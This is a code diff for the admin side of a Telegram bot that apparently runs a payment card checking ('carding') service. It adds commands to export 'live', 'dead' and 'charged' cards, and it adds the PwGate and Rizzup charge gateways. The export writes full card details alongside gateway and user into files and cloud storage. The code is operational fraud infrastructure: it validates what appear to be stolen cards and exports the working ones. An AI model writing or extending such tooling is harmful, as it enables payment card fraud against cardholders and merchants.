@@ -629,6 +629,8 @@ async function setBotCommands(): Promise<void> {
     { command: "allcards", description: "Export all checked cards" },
     { command: "livecards", description: "Export live cards only" },
     { command: "deadcards", description: "Export dead cards only" },
+    { command: "chargedcards", description: "Export charged cards" },
+    { command: "cardstats", description: "Real-time card statistics" },
     { command: "bincard", description: "Export cards by BIN" },
     { command: "viewblocked", description: "View blocked devices/IPs" },
     { command: "unblockdevice", description: "Unblock device/IP" },
@@ -1007,10 +1009,18 @@ async function handleAdminCmd(chatId: string, supabase: any, messageId?: number)
 /unblockdevice <code>[id]</code> - Unblock device/IP
 /userdevices <code>[user]</code> - View user's devices
 
-<b>📊 Data</b>
+<b>📊 Data & Analytics</b>
 /stats - View statistics
 /allusers - List all users
 /userinfo <code>[user]</code> - User details
+/cardstats - Real-time card stats
+
+<b>📁 Card Exports</b>
+/allcards - Export all cards
+/livecards - Export live cards
+/deadcards - Export dead cards
+/chargedcards - Export charged cards
+/bincard <code>[bin]</code> - Export by BIN
 
 <b>📢 Communication</b>
 /broadcast <code>[message]</code> - Send to all users
@@ -5825,10 +5835,38 @@ Use /admincmd for staff panel
 │ /viewbans - Banned list
 └─────────────────────
 
+<b>📁 Card Data</b>
+┌─────────────────────
+│ /cardstats - Real-time stats
+│ /allcards - Export all cards
+│ /livecards - Export live cards
+│ /deadcards - Export dead cards
+│ /chargedcards - Charged cards
+│ /bincard [bin] - By BIN
+└─────────────────────
+
+<b>🚫 Device Blocking</b>
+┌─────────────────────
+│ /viewblocked - Blocked list
+│ /blockdevice [type] [val]
+│ /unblockdevice [id]
+│ /userdevices [user]
+└─────────────────────
+
+<b>🌐 Gateways</b>
+┌─────────────────────
+│ /gate - Status control
+│ /addgate - Add gateway
+│ /editgate [id] - Edit
+│ /delgate [id] - Delete
+│ /healthsites - Health check
+└─────────────────────
+
 <b>📢 Communication</b>
 ┌─────────────────────
 │ /broadcast [msg]
 │ /stats - Statistics
+│ /rejectall - Reject topups
 └─────────────────────
 `;
 
@@ -5950,15 +5988,21 @@ Use /admincmd for staff panel
 /ticket [id] - Manage ticket
 /topups - Pending topups
 /topup [user] - User topup
+/rejectall - Reject all topups
 /addfund [email] [amount]
-/banuser [user]
-/unbanuser [user]
-/deleteuser [user]
-/viewbans - Banned users
+/banuser /unbanuser /deleteuser
+/viewbans /viewblocked
+/blockdevice /unblockdevice
+/userdevices [user]
 /broadcast [msg]
-/stats - Statistics
-/allusers - List users
-/userinfo [user]`;
+/stats /cardstats
+/allusers /userinfo [user]
+/allcards /livecards /deadcards
+/chargedcards /bincard [bin]
+/gate /addgate /editgate /delgate
+/healthsites
+/grantadmin /revokeadmin /admins
+/promote /demote`;
       }
 
       await sendTelegramMessage(chatId, msg, undefined, messageId);
@@ -6514,7 +6558,7 @@ ${gatewayStats || "  No gateway data"}
       });
 
       // Charge gateways that result in actual money charged
-      const chargeGateways = ["paygate_charge", "stripe_charge", "payu_charge"];
+      const chargeGateways = ["paygate_charge", "stripe_charge", "payu_charge", "pwgate_charge", "rizzup_charge"];
       const chargedCount = cards.filter((c: any) => c.result === "live" && chargeGateways.includes(c.gateway)).length;
       const liveCount = cards.filter((c: any) => c.result === "live" && !chargeGateways.includes(c.gateway)).length;
       const deadCount = cards.filter((c: any) => c.result === "dead").length;
@@ -6740,7 +6784,7 @@ ${gatewayStats || "  No gateway data"}
       await sendTelegramMessage(chatId, `${statsMessage}⏳ <b>Fetching charged cards...</b>\n\nPlease wait while I prepare the file.`);
 
       // Charge gateways that result in actual money charged
-      const chargeGateways = ["paygate_charge", "stripe_charge", "payu_charge"];
+      const chargeGateways = ["paygate_charge", "stripe_charge", "payu_charge", "pwgate_charge", "rizzup_charge"];
       
       // Fetch ALL live cards first, then filter by charge gateways
       const allLiveCards = await fetchAllRecords(
@@ -6755,7 +6799,7 @@ ${gatewayStats || "  No gateway data"}
       const cards = allLiveCards.filter((c: any) => chargeGateways.includes(c.gateway));
 
       if (!cards || cards.length === 0) {
-        await sendTelegramMessage(chatId, "❌ <b>No charged cards found</b>\n\nThere are no charged card records in the database.\n\n<i>Charged cards are live cards from PayGate, Stripe Charge, or PayU gateways.</i>");
+        await sendTelegramMessage(chatId, "❌ <b>No charged cards found</b>\n\nThere are no charged card records in the database.\n\n<i>Charged cards are live cards from PayGate, Stripe Charge, PayU, PwGate, or Rizzup gateways.</i>");
         return new Response(JSON.stringify({ ok: true }), { headers: { ...corsHeaders, "Content-Type": "application/json" } });
       }
 
@@ -6782,10 +6826,20 @@ ${gatewayStats || "  No gateway data"}
       const paygateCount = cards.filter((c: any) => c.gateway === "paygate_charge").length;
       const stripeCount = cards.filter((c: any) => c.gateway === "stripe_charge").length;
       const payuCount = cards.filter((c: any) => c.gateway === "payu_charge").length;
+      const pwgateCount = cards.filter((c: any) => c.gateway === "pwgate_charge").length;
+      const rizzupCount = cards.filter((c: any) => c.gateway === "rizzup_charge").length;
+
+      const gatewayLabels: Record<string, string> = {
+        paygate_charge: "PayGate",
+        stripe_charge: "Stripe",
+        payu_charge: "PayU",
+        pwgate_charge: "PwGate",
+        rizzup_charge: "Rizzup",
+      };
 
       const fileContent = cards.map((c: any) => {
         const user = userMap.get(c.user_id) || c.user_id || "Unknown";
-        const gateway = c.gateway === "paygate_charge" ? "PayGate" : c.gateway === "stripe_charge" ? "Stripe" : "PayU";
+        const gateway = gatewayLabels[c.gateway] || c.gateway;
         return `${c.card_details || "Unknown"} | ${gateway} | ${user}`;
       }).join("\n");
       const timestamp = new Date().toISOString().replace(/[:.]/g, "-");
@@ -6803,11 +6857,19 @@ ${gatewayStats || "  No gateway data"}
         console.error("Storage upload error:", uploadError);
       }
 
+      const gatewayBreakdown = [
+        paygateCount > 0 ? `• PayGate: ${paygateCount}` : null,
+        stripeCount > 0 ? `• Stripe: ${stripeCount}` : null,
+        payuCount > 0 ? `• PayU: ${payuCount}` : null,
+        pwgateCount > 0 ? `• PwGate: ${pwgateCount}` : null,
+        rizzupCount > 0 ? `• Rizzup: ${rizzupCount}` : null,
+      ].filter(Boolean).join("\n");
+
       await sendTelegramDocument(
         chatId,
         fileContent,
         filename,
-        `📊 <b>Real-Time Stats</b>\n👥 Users: ${siteStats?.total_users?.toLocaleString() || 0} | 🔍 Checks: ${siteStats?.total_checks?.toLocaleString() || 0}\n\n📁 <b>Charged Cards Export</b>\n\n💳 <b>Total Charged: ${cards.length}</b>\n\n📊 <b>By Gateway:</b>\n• PayGate: ${paygateCount}\n• Stripe: ${stripeCount}\n• PayU: ${payuCount}\n\n<i>Format: card | gateway | user</i>\n\n💾 <i>Saved to storage: chargedcards/${filename}</i>`
+        `📊 <b>Real-Time Stats</b>\n👥 Users: ${siteStats?.total_users?.toLocaleString() || 0} | 🔍 Checks: ${siteStats?.total_checks?.toLocaleString() || 0}\n\n📁 <b>Charged Cards Export</b>\n\n💳 <b>Total Charged: ${cards.length}</b>\n\n📊 <b>By Gateway:</b>\n${gatewayBreakdown}\n\n<i>Format: card | gateway | user</i>\n\n💾 <i>Saved to storage: chargedcards/${filename}</i>`
       );
 
       return new Response(JSON.stringify({ ok: true }), { headers: { ...corsHeaders, "Content-Type": "application/json" } });
